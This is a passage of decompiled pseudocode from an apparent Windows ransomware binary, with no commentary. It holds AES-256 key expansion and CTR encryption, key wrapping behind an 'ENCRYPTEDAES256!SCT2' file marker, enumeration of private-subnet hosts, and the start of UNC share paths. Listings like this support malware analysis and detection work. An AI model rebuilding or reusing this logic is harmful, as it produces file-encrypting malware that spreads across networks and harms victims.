  v41 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM2, 4), _XMM2);
  a2[10] = _XMM3;
  v42 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v41, 4), v41);
  __asm { aeskeygenassist xmm0, xmm3, 0 }
  _XMM2 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v42, 4), v42), (__m128)_mm_shuffle_epi32(_XMM0, 170));
  v45 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM3, 4), _XMM3);
  a2[11] = _XMM2;
  v46 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v45, 4), v45);
  __asm { aeskeygenassist xmm0, xmm2, 20h ; ' ' }
  _XMM4 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v46, 4), v46), (__m128)_mm_shuffle_epi32(_XMM0, 255));
  v49 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM2, 4), _XMM2);
  a2[12] = _XMM4;
  v50 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v49, 4), v49);
  __asm { aeskeygenassist xmm0, xmm4, 0 }
  _XMM3 = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v50, 4), v50), (__m128)_mm_shuffle_epi32(_XMM0, 170));
  a2[13] = _XMM3;
  v53 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)_XMM4, 4), _XMM4);
  v54 = _mm_xor_ps((__m128)_mm_slli_si128((__m128i)v53, 4), v53);
  __asm { aeskeygenassist xmm0, xmm3, 40h ; '@' }
  a2[14] = _mm_xor_ps(_mm_xor_ps((__m128)_mm_slli_si128((__m128i)v54, 4), v54), (__m128)_mm_shuffle_epi32(_XMM0, 255));
}


// ----- sub_140007A10 @ 0x140007a10 -----
__int64 __fastcall sub_140007A10(unsigned __int8 *a1, int *a2)
{
  int *v2; // r10
  int v3; // r9d
  unsigned __int64 v4; // rax
  unsigned int v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned int v9; // eax
  unsigned int v10; // eax
  unsigned int v11; // eax
  __int64 result; // rax

  v2 = a2;
  *a2 = *a1 | ((a1[1] | (*((unsigned __int16 *)a1 + 1) << 8)) << 8);
  a2[1] = a1[4] | ((a1[5] | (*((unsigned __int16 *)a1 + 3) << 8)) << 8);
  a2[2] = a1[8] | ((a1[9] | (*((unsigned __int16 *)a1 + 5) << 8)) << 8);
  a2[3] = a1[12] | ((a1[13] | (*((unsigned __int16 *)a1 + 7) << 8)) << 8);
  a2[4] = a1[16] | ((a1[17] | (*((unsigned __int16 *)a1 + 9) << 8)) << 8);
  a2[5] = a1[20] | ((a1[21] | (*((unsigned __int16 *)a1 + 11) << 8)) << 8);
  a2[6] = a1[24] | ((a1[25] | (*((unsigned __int16 *)a1 + 13) << 8)) << 8);
  v3 = 10;
  a2[7] = a1[28] | ((a1[29] | (*((unsigned __int16 *)a1 + 15) << 8)) << 8);
  do
  {
    v4 = (unsigned int)v2[7];
    if ( (((_BYTE)v3 - 2) & 7) != 0 )
    {
      if ( (((_BYTE)v3 - 2) & 7) == 4 )
        LODWORD(v4) = (unsigned __int8)byte_1400101F0[(unsigned __int8)v4]
                    | (((unsigned __int8)byte_1400101F0[BYTE1(v4)]
                      | ((((unsigned __int8)byte_1400101F0[v4 >> 24] << 8) | (unsigned __int8)byte_1400101F0[BYTE2(v4)]) << 8)) << 8);
    }
    else
    {
      v5 = __ROR4__(v4, 8);
      LODWORD(v4) = dword_1400102EC[(__int64)(v3 - 2) >> 3]
                  ^ ((unsigned __int8)byte_1400101F0[(unsigned __int8)v5]
                   | (((unsigned __int8)byte_1400101F0[BYTE1(v5)]
                     | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v5 >> 24] << 8)
                       | (unsigned __int8)byte_1400101F0[BYTE2(v5)]) << 8)) << 8));
    }
    v6 = *v2 ^ v4;
    v2[8] = v6;
    if ( (((_BYTE)v3 - 1) & 7) != 0 )
    {
      if ( (((_BYTE)v3 - 1) & 7) == 4 )
        v6 = (unsigned __int8)byte_1400101F0[(unsigned __int8)v6]
           | (((unsigned __int8)byte_1400101F0[BYTE1(v6)]
             | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v6 >> 24] << 8)
               | (unsigned __int8)byte_1400101F0[BYTE2(v6)]) << 8)) << 8);
    }
    else
    {
      v7 = __ROR4__(v6, 8);
      v6 = dword_1400102EC[(__int64)(v3 - 1) >> 3]
         ^ ((unsigned __int8)byte_1400101F0[(unsigned __int8)v7]
          | (((unsigned __int8)byte_1400101F0[BYTE1(v7)]
            | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v7 >> 24] << 8)
              | (unsigned __int8)byte_1400101F0[BYTE2(v7)]) << 8)) << 8));
    }
    v8 = v2[1] ^ v6;
    v2[9] = v8;
    if ( (v3 & 7) != 0 )
    {
      if ( (v3 & 7) == 4 )
        v8 = (unsigned __int8)byte_1400101F0[(unsigned __int8)v8]
           | (((unsigned __int8)byte_1400101F0[BYTE1(v8)]
             | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v8 >> 24] << 8)
               | (unsigned __int8)byte_1400101F0[BYTE2(v8)]) << 8)) << 8);
    }
    else
    {
      v9 = __ROR4__(v8, 8);
      v8 = dword_1400102EC[(__int64)v3 >> 3]
         ^ ((unsigned __int8)byte_1400101F0[(unsigned __int8)v9]
          | (((unsigned __int8)byte_1400101F0[BYTE1(v9)]
            | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v9 >> 24] << 8)
              | (unsigned __int8)byte_1400101F0[BYTE2(v9)]) << 8)) << 8));
    }
    v10 = v2[2] ^ v8;
    v2[10] = v10;
    if ( (((_BYTE)v3 + 1) & 7) != 0 )
    {
      if ( (((_BYTE)v3 + 1) & 7) == 4 )
        v10 = (unsigned __int8)byte_1400101F0[(unsigned __int8)v10]
            | (((unsigned __int8)byte_1400101F0[BYTE1(v10)]
              | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v10 >> 24] << 8)
                | (unsigned __int8)byte_1400101F0[BYTE2(v10)]) << 8)) << 8);
    }
    else
    {
      v11 = __ROR4__(v10, 8);
      v10 = dword_1400102EC[(__int64)(v3 + 1) >> 3]
          ^ ((unsigned __int8)byte_1400101F0[(unsigned __int8)v11]
           | (((unsigned __int8)byte_1400101F0[BYTE1(v11)]
             | ((((unsigned __int8)byte_1400101F0[(unsigned __int64)v11 >> 24] << 8)
               | (unsigned __int8)byte_1400101F0[BYTE2(v11)]) << 8)) << 8));
    }
    v3 += 4;
    v2[11] = v2[3] ^ v10;
    v2 += 4;
    result = (unsigned int)(v3 - 2);
  }
  while ( (int)result < 60 );
  return result;
}


// ----- sub_140007EA0 @ 0x140007ea0 -----
__int64 __fastcall sub_140007EA0(__m128 *a1, __m128i *a2, __int64 a3)
{
  bool v6; // zf
  __int64 result; // rax

  v6 = dword_140017008 == 0;
  if ( dword_140017008 < 0 )
  {
    _RAX = 1;
    __asm { cpuid }
    dword_140017008 = (_RCX & 0x2000000) != 0;
    v6 = (_RCX & 0x2000000) == 0;
  }
  if ( v6 )
    sub_140007A10((unsigned __int8 *)a2, (int *)a1);
  else
    sub_140007710(a2, a1);
  sub_14000A850(&a1[15], 0, 16);
  result = sub_14000A820(&a1[15], a3, 8);
  a1[16].m128_u64[0] = 0;
  return result;
}


// ----- sub_140007F40 @ 0x140007f40 -----
void __fastcall sub_140007F40(const __m128i *a1, __m128i *a2, unsigned __int64 a3)
{
  int v5; // ecx
  signed __int64 v12; // rdx
  unsigned __int64 v13; // rbx
  __int64 v14; // r9
  __m128i *v15; // r10
  __m128 v16; // xmm2
  __int64 v17; // rcx
  __m128i inserted; // xmm1
  __m128 v19; // xmm0
  __m128 v20; // xmm3
  __m128 v21; // xmm4
  __m128 v22; // xmm10
  __m128 v23; // xmm11
  __m128 v24; // xmm12
  __m128 v25; // xmm13
  __int64 v30; // rcx
  __int64 v35; // rcx
  __int64 v39; // rcx
  __int64 v43; // rcx
  __int64 v47; // rcx
  __int64 v51; // rcx
  __int64 i; // rcx
  __m128i *v58; // r8
  __int64 j; // rcx
  _QWORD v66[2]; // [rsp+20h] [rbp-C8h] BYREF
  _BYTE v67[16]; // [rsp+30h] [rbp-B8h] BYREF
  __int64 v68; // [rsp+108h] [rbp+20h] BYREF

  _RSI = a1;
  v5 = dword_140017008;
  if ( dword_140017008 < 0 )
  {
    _RAX = 1;
    __asm { cpuid }
    v5 = (_RCX & 0x2000000) != 0;
    v66[0] = __PAIR64__(_RBX, _RAX);
    dword_140017008 = v5;
    HIDWORD(v66[1]) = _RDX;
  }
  v12 = _RSI[16].m128i_i64[0];
  v13 = 0;
  if ( v5 != 0 )
  {
    v14 = 13;
    if ( a3 >= 0x80 )
    {
      v15 = a2 + 2;
      do
      {
        v16 = (__m128)_mm_loadu_si128(_RSI);
        v17 = 13;
        inserted = _mm_insert_epi64((__m128i)0LL, _RSI[15].m128i_i64[0], 0);
        v19 = (__m128)_mm_insert_epi64(inserted, v12 + 1, 1);
        v20 = (__m128)_mm_insert_epi64(inserted, v12 + 2, 1);
        v21 = (__m128)_mm_insert_epi64(inserted, v12 + 3, 1);
        v22 = (__m128)_mm_insert_epi64(inserted, v12 + 4, 1);
        v23 = (__m128)_mm_insert_epi64(inserted, v12 + 5, 1);
        v24 = (__m128)_mm_insert_epi64(inserted, v12 + 6, 1);
        v25 = (__m128)_mm_insert_epi64(inserted, v12 + 7, 1);
        _RAX = _RSI + 1;
        _XMM1 = _mm_xor_ps((__m128)_mm_insert_epi64(inserted, v12, 1), v16);
        do
        {
          __asm { aesenc  xmm1, xmmword ptr [rax] }
          ++_RAX;
          --v17;
        }
        while ( v17 != 0 );
        _XMM9 = _mm_loadu_si128(_RSI + 14);
        _RAX = _RSI + 1;
        v30 = 13;
        __asm { aesenclast xmm1, xmm9 }
        _XMM8 = _mm_xor_ps(v16, v19);
        do
        {
          __asm { aesenc  xmm8, xmmword ptr [rax] }
          ++_RAX;
          --v30;
        }
        while ( v30 != 0 );
        _RAX = _RSI + 1;
        _XMM7 = _mm_xor_ps(v16, v20);
        v35 = 13;
        __asm { aesenclast xmm8, xmm9 }
        do
        {
          __asm { aesenc  xmm7, xmmword ptr [rax] }
          ++_RAX;
          --v35;
        }
        while ( v35 != 0 );
        _RAX = _RSI + 1;
        _XMM6 = _mm_xor_ps(v16, v21);
        v39 = 13;
        __asm { aesenclast xmm7, xmm9 }
        do
        {
          __asm { aesenc  xmm6, xmmword ptr [rax] }
          ++_RAX;
          --v39;
        }
        while ( v39 != 0 );
        _RAX = _RSI + 1;
        _XMM5 = _mm_xor_ps(v16, v22);
        v43 = 13;
        __asm { aesenclast xmm6, xmm9 }
        do
        {
          __asm { aesenc  xmm5, xmmword ptr [rax] }
          ++_RAX;
          --v43;
        }
        while ( v43 != 0 );
        _RAX = _RSI + 1;
        _XMM4 = _mm_xor_ps(v16, v23);
        v47 = 13;
        __asm { aesenclast xmm5, xmm9 }
        do
        {
          __asm { aesenc  xmm4, xmmword ptr [rax] }
          ++_RAX;
          --v47;
        }
        while ( v47 != 0 );
        _RAX = _RSI + 1;
        _XMM3 = _mm_xor_ps(v16, v24);
        v51 = 13;
        __asm { aesenclast xmm4, xmm9 }
        do
        {
          __asm { aesenc  xmm3, xmmword ptr [rax] }
          ++_RAX;
          --v51;
        }
        while ( v51 != 0 );
        __asm { aesenclast xmm3, xmm9 }
        _XMM2 = _mm_xor_ps(v16, v25);
        _RAX = _RSI + 1;
        for ( i = 13; i != 0; --i )
        {
          __asm { aesenc  xmm2, xmmword ptr [rax] }
          ++_RAX;
        }
        v12 += 8LL;
        v13 += 128LL;
        __asm { aesenclast xmm2, xmm9 }
        v15[-2] = (__m128i)_mm_xor_ps(_XMM1, (__m128)_mm_loadu_si128(v15 - 2));
        v15[-1] = (__m128i)_mm_xor_ps((__m128)_mm_loadu_si128(v15 - 1), _XMM8);
        *(__m128 *)v15 = _mm_xor_ps((__m128)_mm_loadu_si128(v15), _XMM7);
        v15[1] = (__m128i)_mm_xor_ps((__m128)_mm_loadu_si128(v15 + 1), _XMM6);
        v15[2] = (__m128i)_mm_xor_ps(_XMM5, (__m128)_mm_loadu_si128(v15 + 2));
        v15[3] = (__m128i)_mm_xor_ps((__m128)_mm_loadu_si128(v15 + 3), _XMM4);
        v15[4] = (__m128i)_mm_xor_ps((__m128)_mm_loadu_si128(v15 + 4), _XMM3);
        v15[5] = (__m128i)_mm_xor_ps(_XMM2, (__m128)_mm_loadu_si128(v15 + 5));
        v15 += 8;
      }
      while ( (unsigned __int64)v15->m128i_u64 + 96LL - (_QWORD)a2 <= a3 );
    }
    if ( v13 + 16 <= a3 )
    {
      v58 = (__m128i *)((char *)a2 + v13);
      do
      {
        _RAX = _RSI + 1;
        _XMM1 = _mm_xor_ps(
                  (__m128)_mm_insert_epi64(_mm_insert_epi64((__m128i)0LL, _RSI[15].m128i_i64[0], 0), v12, 1),
                  *(__m128 *)_RSI);
        for ( j = 13; j != 0; --j )
        {
          __asm { aesenc  xmm1, xmmword ptr [rax] }
          ++_RAX;
        }
        ++v12;
        v13 += 16LL;
        __asm { aesenclast xmm1, xmmword ptr [rsi+0E0h] }
        *(__m128 *)v58 = _mm_xor_ps(_XMM1, (__m128)_mm_loadu_si128(v58));
        ++v58;
      }
      while ( (unsigned __int64)v58->m128i_u64 + 16LL - (_QWORD)a2 <= a3 );
    }
    if ( v13 < a3 )
    {
      _RAX = _RSI + 1;
      _XMM0 = _mm_xor_ps(
                (__m128)_mm_insert_epi64(_mm_insert_epi64((__m128i)0LL, _RSI[15].m128i_i64[0], 0), v12, 1),
                *(__m128 *)_RSI);
      do
      {
        __asm { aesenc  xmm0, xmmword ptr [rax] }
        ++_RAX;
        --v14;
      }
      while ( v14 != 0 );
      __asm { aesenclast xmm0, xmmword ptr [rsi+0E0h] }
      *(_OWORD *)v66 = _XMM0;
      do
      {
        a2->m128i_i8[v13] ^= *((_BYTE *)v66 + (v13 & 0xF));
        ++v13;
      }
      while ( v13 < a3 );
      ++v12;
    }
  }
  else
  {
    v68 = _RSI[16].m128i_i64[0];
    if ( a3 != 0 )
    {
      do
      {
        if ( (v13 & 0xF) == 0 )
        {
          sub_14000A820(v66, &_RSI[15], 8);
          sub_14000A820(&v66[1], &v68, 8);
          sub_140007120((__int64)_RSI, (__int64)v66, (__int64)v67);
          v12 = ++v68;
        }
        a2->m128i_i8[v13] ^= v67[v13 & 0xF];
        ++v13;
      }
      while ( v13 < a3 );
    }
  }
  _RSI[16].m128i_i64[0] = v12;
}


// ----- sub_140008450 @ 0x140008450 -----
__int64 sub_140008450(__int64 a1, __int64 a2, char a3, ...)
{
  __int64 v6; // rdi
  int v8[4]; // [rsp+40h] [rbp-158h] BYREF
  _BYTE v9[64]; // [rsp+50h] [rbp-148h] BYREF
  _BYTE v10[256]; // [rsp+90h] [rbp-108h] BYREF
  __int64 v11; // [rsp+1B8h] [rbp+20h] BYREF
  va_list va; // [rsp+1B8h] [rbp+20h]
  __int64 v13; // [rsp+1C0h] [rbp+28h] BYREF
  va_list va1; // [rsp+1C0h] [rbp+28h]
  __int64 v15; // [rsp+1C8h] [rbp+30h]
  va_list va2; // [rsp+1D0h] [rbp+38h] BYREF

  va_start(va2, a3);
  va_start(va1, a3);
  va_start(va, a3);
  v11 = va_arg(va1, _QWORD);
  va_copy(va2, va1);
  v13 = va_arg(va2, _QWORD);
  v15 = va_arg(va2, _QWORD);
  v8[0] = 64;
  if ( dword_140017688 == 0 || qword_140017678 == 0 )
    return 0xFFFFFFFFLL;
  sub_14000A850(v9, 0, 64);
  sub_14000A820(v9, "SCT2", 4);
  v9[4] = a3;
  sub_14000A820(&v9[8], (__int64 *)va, 8);
  sub_14000A820(&v9[16], (__int64 *)va1, 8);
  sub_14000A820(&v9[24], a1, 32);
  sub_14000A820(&v9[56], a2, 8);
  sub_14000A820(v10, v9, 64);
  qword_1400188B8(qword_140017678, 0, 1, 0, v10, v8, 256);
  v6 = v15;
  sub_14000A820(v15, v10, 256);
  sub_14000A820(v6 + 256, "ENCRYPTEDAES256!SCT2", 16);
  memset(v9, 0, sizeof(v9));
  memset(v10, 0, sizeof(v10));
  return 0;
}


// ----- sub_1400085E0 @ 0x1400085e0 -----
__int64 __fastcall sub_1400085E0(__int64 a1, __int64 a2)
{
  unsigned int v3; // ebx
  unsigned int v4; // edi
  bool v5; // zf
  __int64 result; // rax
  int v7; // ebx
  __int64 v8; // [rsp+50h] [rbp+18h] BYREF

  v3 = a2;
  if ( qword_140017670 != 0 )
  {
    v4 = 0;
    v5 = (unsigned int)qword_1400188C0(qword_140017670, a2, a1) == 0;
  }
  else
  {
    v4 = 0;
    v8 = 0;
    result = qword_1400188A0(&v8, 0, 0, 24, -268435456);
    if ( (_DWORD)result == 0 )
      return result;
    v7 = qword_1400188C0(v8, v3, a1);
    qword_1400188D0(v8, 0);
    v5 = v7 == 0;
  }
  LOBYTE(v4) = !v5;
  return v4;
}


// ----- sub_140008690 @ 0x140008690 -----
__int64 sub_140008690()
{
  if ( qword_140017678 != 0 )
    qword_1400188B0();
  if ( qword_140017680 != 0 )
    qword_1400188B0();
  if ( qword_140017670 != 0 )
    qword_1400188D0(qword_140017670, 0);
  qword_140017680 = 0;
  qword_140017678 = 0;
  qword_140017670 = 0;
  dword_140017688 = 0;
  return 0;
}


// ----- sub_1400086F0 @ 0x1400086f0 -----
__int64 __fastcall sub_1400086F0(_BYTE *a1, _BYTE *a2)
{
  _BYTE v5[1024]; // [rsp+40h] [rbp-1408h] BYREF
  _BYTE v6[4104]; // [rsp+440h] [rbp-1008h] BYREF
  unsigned int v7; // [rsp+1460h] [rbp+18h] BYREF
  unsigned int v8; // [rsp+1468h] [rbp+20h] BYREF

  if ( dword_140017688 != 0 )
    return 0;
  if ( a1 == nullptr
    || *a1 == 0
    || *a1 == 35
    || (unsigned int)qword_1400188A0(&qword_140017670, 0, 0, 24, -268435456) == 0 )
  {
    return 0xFFFFFFFFLL;
  }
  v7 = 1024;
  if ( (unsigned int)qword_1400188E0(a1, 0, 1, v5, &v7, 0, 0) == 0
    || (unsigned int)qword_1400188C8(qword_140017670, v5, v7, 0, 0, &qword_140017678) == 0 )
  {
    if ( qword_140017678 != 0 )
    {
      qword_1400188B0();
      qword_140017678 = 0;
    }
    if ( qword_140017680 != 0 )
    {
      qword_1400188B0();
      qword_140017680 = 0;
    }
    if ( qword_140017670 != 0 )
    {
      qword_1400188D0(qword_140017670, 0);
      qword_140017670 = 0;
    }
    return 0xFFFFFFFFLL;
  }
  if ( a2 != nullptr && *a2 != 0 && *a2 != 35 )
  {
    v8 = 4096;
    if ( (unsigned int)qword_1400188E0(a2, 0, 1, v6, &v8, 0, 0) != 0 )
      qword_1400188C8(qword_140017670, v6, v8, 0, 0, &qword_140017680);
  }
  dword_140017688 = 1;
  return 0;
}


// ----- sub_1400088F0 @ 0x1400088f0 -----
__int64 __fastcall sub_1400088F0(char *a1, __int64 a2, __int64 a3, _DWORD *a4, __int64 a5, __int64 a6)
{
  unsigned int v11[4]; // [rsp+30h] [rbp-58h] BYREF
  _BYTE v12[64]; // [rsp+40h] [rbp-48h] BYREF

  v11[0] = 256;
  if ( dword_140017688 == 0 || qword_140017680 == 0 )
    return 0xFFFFFFFFLL;
  if ( (unsigned int)sub_14000A7E0(a1 + 256, "ENCRYPTEDAES256!SCT2", 16) != 0 )
    return 4294967294LL;
  if ( (unsigned int)qword_1400188A8(qword_140017680, 0, 1, 0, a1, v11) == 0 )
    return -3 - (unsigned int)qword_140018710();
  if ( v11[0] < 0x40 )
    return 4294967286LL;
  sub_14000A820(v12, a1, 64);
  if ( (unsigned int)sub_14000A7E0(v12, "SCT2", 4) != 0 )
    return 4294967292LL;
  if ( a4 != nullptr )
    *a4 = v12[4];
  if ( a5 != 0 )
    sub_14000A820(a5, &v12[8], 8);
  if ( a6 != 0 )
    sub_14000A820(a6, &v12[16], 8);
  if ( a2 != 0 )
    sub_14000A820(a2, &v12[24], 32);
  if ( a3 != 0 )
    sub_14000A820(a3, &v12[56], 8);
  memset(v12, 0, sizeof(v12));
  memset(a1, 0, 0x40u);
  return 0;
}


// ----- sub_140008AA0 @ 0x140008aa0 -----
void __fastcall sub_140008AA0(__int64 a1)
{
  __int64 v2; // rsi
  void (__fastcall *v3)(__int64, __int64, _QWORD, char *, _QWORD); // rbx
  unsigned int v4; // eax
  char v5; // [rsp+48h] [rbp+10h] BYREF

  if ( dword_140017ED0 != 0 && dword_1400176A4 != 0 )
  {
    qword_140018690(&unk_140017EA8);
    v2 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v2 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v3 = (void (__fastcall *)(__int64, __int64, _QWORD, char *, _QWORD))qword_140018880;
      v4 = qword_1400187C8(a1);
      v3(v2, a1, v4, &v5, 0);
    }
    qword_140018790(&unk_140017EA8);
  }
}


// ----- sub_140008B40 @ 0x140008b40 -----
__int64 __fastcall sub_140008B40(int a1)
{
  int v1; // r9d
  __int64 v2; // rcx
  _BYTE *v3; // r11
  int v4; // r10d
  __int64 v5; // rbx
  __int64 i; // r8
  char v7; // dl
  bool v8; // zf
  __int64 result; // rax
  __int64 v10; // rdi
  void (__fastcall *v11)(__int64, _BYTE *, _QWORD, char *, _QWORD); // rbx
  unsigned int v12; // eax
  _BYTE v13[16]; // [rsp+30h] [rbp-18h] BYREF
  char v14; // [rsp+50h] [rbp+8h] BYREF

  if ( a1 < 0 )
    v13[0] = 45;
  v1 = -a1;
  if ( a1 > 0 )
    v1 = a1;
  v2 = (unsigned int)a1 >> 31;
  v3 = &v13[v2];
  if ( v1 != 0 )
  {
    v4 = v2;
    do
    {
      v5 = v4++;
      *v3++ = v1 % 10 + 48;
      v1 /= 10;
    }
    while ( v1 != 0 );
    for ( i = v5; v2 < i; --i )
    {
      v7 = v13[v2];
      v13[v2++] = v13[i];
      v13[i] = v7;
    }
  }
  else
  {
    *v3 = 48;
    v4 = v2 + 1;
  }
  v8 = dword_140017ED0 == 0;
  result = v4;
  v13[v4] = 0;
  if ( !v8 && dword_1400176A4 != 0 )
  {
    qword_140018690(&unk_140017EA8);
    v10 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v10 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v11 = (void (__fastcall *)(__int64, _BYTE *, _QWORD, char *, _QWORD))qword_140018880;
      v12 = qword_1400187C8(v13);
      v11(v10, v13, v12, &v14, 0);
    }
    return qword_140018790(&unk_140017EA8);
  }
  return result;
}


// ----- sub_140008C90 @ 0x140008c90 -----
__int64 sub_140008C90()
{
  unsigned int v0; // esi
  unsigned int v1; // ebp
  __int64 v2; // rdx
  __int64 v3; // rcx
  __int64 (__fastcall *v4)(__int64, __int64, _QWORD); // rdi
  unsigned int v5; // ebx
  __int64 v6; // rax
  __int64 v7; // rax
  unsigned int *v8; // rdi
  __int64 v9; // rdx
  __int64 v10; // rcx
  void (__fastcall *v11)(__int64, _QWORD, unsigned int *); // rbx
  __int64 v12; // rax
  unsigned int v14; // ebx
  int v15; // r8d
  unsigned int v16; // r10d
  _DWORD *v17; // r11
  __int64 v18; // r9
  int v19; // eax
  _DWORD *v20; // rax
  __int64 v21; // rax
  __int64 v22; // rax
  void (__fastcall *v23)(__int64, _QWORD, unsigned int *); // rbx
  __int64 v24; // rax
  int v25; // edx
  int *v26; // r9
  unsigned int v27; // r8d
  int v28; // eax
  __int64 v29; // rcx
  _DWORD v30[70]; // [rsp+20h] [rbp-118h] BYREF
  unsigned int v31; // [rsp+140h] [rbp+8h] BYREF

  v0 = 0;
  v31 = 0;
  v1 = 0;
  qword_140018A50(0, &v31, 0);
  if ( v31 == 0 )
    return 0;
  v4 = (__int64 (__fastcall *)(__int64, __int64, _QWORD))qword_140018768;
  v5 = v31;
  v6 = qword_140018740(v3, v2);
  v7 = v4(v6, 8, v5);
  v8 = (unsigned int *)v7;
  if ( v7 == 0 )
    return 0;
  if ( (unsigned int)qword_140018A50(v7, &v31, 0) != 0 )
  {
    v11 = (void (__fastcall *)(__int64, _QWORD, unsigned int *))qword_140018770;
    v12 = qword_140018740(v10, v9);
    v11(v12, 0, v8);
    return 0;
  }
  v14 = *v8;
  v15 = 0;
  dword_140018630 = 0;
  v16 = 0;
  if ( v14 == 0 )
    goto LABEL_28;
  v17 = v8 + 5;
  v18 = 0;
  while ( v18 < 64 )
  {
    v10 = (unsigned int)*v17;
    v19 = *v17 >> 8;
    if ( (_BYTE)v10 == 10 )
      goto LABEL_16;
    if ( (_BYTE)v10 == 0xC0 )
    {
      if ( (_BYTE)v19 == 0xA8 )
        goto LABEL_16;
    }
    else if ( (_BYTE)v10 == 0xAC && (unsigned __int8)v19 >= 0x10u && (unsigned __int8)v19 <= 0x1Fu )
    {
LABEL_16:
      if ( v15 < 256 )
      {
        v9 = 0;
        if ( v15 <= 0 )
        {
LABEL_21:
          v21 = v15++;
          dword_140018230[v21] = v10;
        }
        else
        {
          v20 = dword_140018230;
          while ( *v20 != (_DWORD)v10 )
          {
            v9 = (unsigned int)(v9 + 1);
            ++v20;
            if ( (int)v9 >= v15 )
              goto LABEL_21;
          }
        }
      }
      v10 &= 0xFFFFFFu;
      v22 = 0;
      if ( v18 <= 0 )
      {
LABEL_25:
        ++v1;
        v30[v18++] = v10;
      }
      else
      {
        while ( v30[v22] != (_DWORD)v10 )
        {
          if ( ++v22 >= v18 )
            goto LABEL_25;
        }
      }
    }
    ++v16;
    v17 += 6;
    if ( v16 >= v14 )
      break;
  }
  dword_140018630 = v15;
LABEL_28:
  v23 = (void (__fastcall *)(__int64, _QWORD, unsigned int *))qword_140018770;
  v24 = qword_140018740(v10, v9);
  v23(v24, 0, v8);
  if ( v1 == 0 )
    return 0;
  v25 = dword_140017EDC;
  v26 = v30;
  v27 = 0;
  do
  {
    if ( v25 >= 64 )
      break;
    v28 = *v26;
    ++v27;
    v29 = v25;
    ++v26;
    dword_140017EDC = ++v25;
    dword_140018130[v29] = v28;
  }
  while ( v27 < v1 );
  LOBYTE(v0) = v25 > 0;
  return v0;
}


// ----- sub_140008E70 @ 0x140008e70 -----
int __fastcall sub_140008E70(__int64 a1, int a2)
{
  __int64 v3; // rsi
  int v4; // r13d
  __int64 v5; // rax
  int v6; // ebx
  unsigned int v7; // r15d
  __int64 v8; // rbx
  __int64 v9; // rdi
  __int64 v10; // rax
  __int64 (__fastcall *v11)(__int64, _QWORD, __int64); // rbx
  __int64 v12; // rsi
  __int64 v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // rax
  __int64 (__fastcall *v16)(__int64, __int64, __int64); // rbx
  __int64 v17; // rdx
  __int64 v18; // rcx
  __int64 v19; // rax
  __int64 v20; // rdx
  __int64 v21; // rcx
  __int64 *v22; // rdi
  int v23; // eax
  __int64 (__fastcall *v24)(__int64, _QWORD, __int64); // rbx
  __int64 v25; // rcx
  __int64 v26; // r14
  __int64 v27; // rdx
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 v30; // rdx
  __int64 v31; // rcx
  void (__fastcall *v32)(__int64, _QWORD, __int64 *); // rbx
  __int64 v33; // rax
  __int64 v34; // rax
  __int64 (__fastcall *v35)(__int64, _QWORD, __int64); // rbx
  __int64 v36; // rax
  __int64 v37; // rdi
  void (__fastcall *v38)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v39; // eax
  __int64 v40; // rdi
  void (__fastcall *v41)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v42; // eax
  __int64 v43; // rax
  __int64 v44; // rdi
  __int64 v45; // rax
  void (__fastcall *v46)(__int64, _QWORD, __int64); // rbx
  __int64 v47; // r14
  __int64 v48; // rdx
  __int64 v49; // rcx
  __int64 v50; // rax
  _WORD *v51; // rsi
  _WORD *v52; // rax
  __int64 v53; // rdx
  __int64 v54; // rcx
  _WORD *v55; // rdi
  __int64 v56; // rdx
  __int64 v57; // rcx
  void (__fastcall *v58)(__int64, _QWORD, _WORD *); // rbx
  __int64 v59; // rax
  void (__fastcall *v60)(__int64, _QWORD, _WORD *); // rbx
  __int64 v61; // rax
  void (__fastcall *v62)(__int64, _QWORD, _WORD *); // rbx
  __int64 v63; // rdx
  __int64 v64; // rcx
  __int64 v65; // rax
  void (__fastcall *v66)(__int64, _QWORD, __int64); // rbx
  __int64 v67; // rdx
  __int64 v68; // rcx
  __int64 v69; // rax
  __int64 v70; // rdi
  int v71; // ebx
  int v72; // eax
  __int64 v73; // rbx
  void (__fastcall *v74)(__int64, _QWORD, _WORD *); // rbx
  __int64 v75; // rax
  void (__fastcall *v76)(__int64, _QWORD, _WORD *); // rbx
  __int64 v77; // rax
  __int64 (__fastcall *v78)(__int64, _QWORD, __int64); // rbx
  __int64 v79; // rax
  int v81; // [rsp+70h] [rbp-90h] BYREF
  __int64 v82; // [rsp+78h] [rbp-88h] BYREF
  _DWORD v83[4]; // [rsp+80h] [rbp-80h] BYREF
  __int16 v84; // [rsp+90h] [rbp-70h] BYREF
  _BYTE v85[62]; // [rsp+92h] [rbp-6Eh] BYREF
  _BYTE v86[128]; // [rsp+D0h] [rbp-30h] BYREF
  _BYTE v87[1072]; // [rsp+150h] [rbp+50h] BYREF
  unsigned int v89; // [rsp+5A0h] [rbp+4A0h] BYREF
  int v90; // [rsp+5A8h] [rbp+4A8h] BYREF

  v84 = 23644;
  v3 = a1;
  v90 = 0;
  qword_1400187B0(v85, a1);
  qword_1400187D8(65001, 0, &v84, 0xFFFFFFFFLL, v86, 64);
  v4 = 0;
  do
  {
    v82 = 0;
    v89 = 0;
